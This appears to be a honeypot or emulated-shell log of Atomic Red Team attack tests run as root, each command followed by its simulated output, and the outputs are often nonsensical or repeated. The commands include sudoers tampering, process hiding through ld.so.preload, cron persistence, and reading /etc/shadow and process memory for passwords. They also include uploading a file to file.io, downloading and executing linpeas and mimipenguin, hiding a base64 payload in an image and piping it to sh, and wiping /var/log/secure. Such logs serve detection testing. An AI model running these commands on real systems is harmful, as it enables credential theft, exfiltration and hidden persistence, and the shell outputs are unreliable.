+response:ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
+bash: sed: command not found
+root@svr04:~# Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+response:sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+Blocked command!
+sudo: Only one of the -e, -h, -i, -K, -l, -s, -v or -V options may be specified
+usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...
+root@svr04:~# 
+
+action:
+command:sudo visudo -c -f /etc/sudoers
+response:sudo visudo -c -f /etc/sudoers
+
+
+action:
+command:cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+response:cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+
+
+action:
+command:if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+response:if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+bash: sed: command not found
+bash: if: command not found
+bash: then: command not found
+bash: fi: command not found
+root@svr04:~# bash: find: command not found
+root@svr04:~# 
+
+action:
+command:find . -type f -iname *.pdf >> /tmp/T1083.txt
+response:find . -type f -iname *.pdf >> /tmp/T1083.txt
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+response:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+
+
+action:
+command:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+response:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+
+
+action:
+command:mkdir -p /tmp/atomic && cd /tmp/atomic
+response:mkdir -p /tmp/atomic && cd /tmp/atomic
+
+
+action:
+command:curl -sLO https://github.com/gianlucaborello/libprocesshider//archive/25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && unzip 25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && cd libprocesshider-25e0587d6bf2137f8792dc83242b6b0e5a72b415
+response:curl -sLO https://github.com/gianlucaborello/libprocesshider//archive/25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && unzip 25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && cd libprocesshider-25e0587d6bf2137f8792dc83242b6b0e5a72b415
+
+
+action:
+command:make
+response:make
+
+
+action:
+command:cp libprocesshider.so /usr/local/lib/libprocesshider.so
+response:cp libprocesshider.so /usr/local/lib/libprocesshider.so
+bash: unzip: command not found
+
+
+action:
+command:cp /usr/bin/ping /usr/local/bin/evil_script.py
+response:cp /usr/bin/ping /usr/local/bin/evil_script.py
+
+
+action:
+command:echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
+response:echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'
+response:echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'
+
+
+action:
+command:echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'
+response:echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'
+
+
+action:
+command:echo "echo Hello from Atomic Red Team" | at now + 1 minute
+response:echo "echo Hello from Atomic Red Team" | at now + 1 minute
+bash: at: command not found
+root@svr04:~# 
+
+action:
+command:touch /tmp/T1070.006-reference.txt
+response:touch /tmp/T1070.006-reference.txt
+
+
+action:
+command:touch -acmr /bin/sh /tmp/T1070.006-reference.txt
+response:touch -acmr /bin/sh /tmp/T1070.006-reference.txt
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:ps >> /tmp/loot.txt
+response:ps >> /tmp/loot.txt
+
+
+action:
+command:ps aux >> /tmp/loot.txt
+response:ps aux >> /tmp/loot.txt
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install systemd on the machine."; exit 1;
+response:echo "Install systemd on the machine."; exit 1;
+
+
+action:
+command:systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
+response:systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
+
+
+action:
+command:unamestr=$(uname)
+response:unamestr=$(uname)
+bash: systemd-run: command not found
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
+response:if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
+bash: if: command not found
+bash: ed: command not found
+bash: elif: command not found
+bash: ed: command not found
+bash: fi: command not found
+root@svr04:~# bash: then: command not found
+root@svr04:~# bash: then: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo ""
+response:echo ""
+
+
+action:
+command:PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+response:PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+response:echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+
+
+action:
+command:tail /var/log/syslog
+response:tail /var/log/syslog
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'
+response:echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'
+
+
+action:
+command:echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'
+response:echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'
+
+
+action:
+command:echo "echo Hello from Atomic Red Team" | at now + 1 minute
+response:echo "echo Hello from Atomic Red Team" | at now + 1 minute
+bash: at: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
+
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+
+
+action:
+command:echo 0> /var/log/secure
+response:echo 0> /var/log/secure
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:root@svr04:~# if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:curl -F 'file=@/home/atomic/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+response:curl -F 'file=@/home/atomic/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+response:cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+
+
+action:
+command:if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+response:if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+bash: sed: command not found
+bash: if: command not found
+bash: then: command not found
+bash: fi: command not found
+root@svr04:~# bash: find: command not found
+root@svr04:~# 
+
+action:
+command:find . -type f -iname *.pdf >> /tmp/T1083.txt
+response:find . -type f -iname *.pdf >> /tmp/T1083.txt
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+response:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+response:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+response:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+response:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+response:root@svr04:~# dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+
+
+action:
+command:grep -i "PASS" "/tmp/T1003.007.bin"
+response:grep -i "PASS" "/tmp/T1003.007.bin"
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+bash: $: command not found
+bash: [: command not found
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:(which pkg && pkg install -y bash)
+response:(which pkg && pkg install -y bash)
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:pip install requests
+response:pip install requests
+
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: pip: command not found
+bash: $: command not found
+
+
+action:
+command:$which_python -c "import pty;pty.spawn('/bin/sh')"
+response:$which_python -c "import pty;pty.spawn('/bin/sh')"
+
+
+action:
+command:exit
+response:exit
+
+
+action:
+command:$which_python -c "import pty;pty.spawn('/bin/bash')"
+response:$which_python -c "import pty;pty.spawn('/bin/bash')"
+bash: $: command not found
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+
+
+action:
+command:hostname
+response:hostname
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+response:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
+response:(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
+bash: yum: command not found
+
+
+action:
+command:if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: uniq: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# bash: sort: command not found
+root@svr04:~# 
+
+action:
+command:grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
+response:grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
+
+
+action:
+command:grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
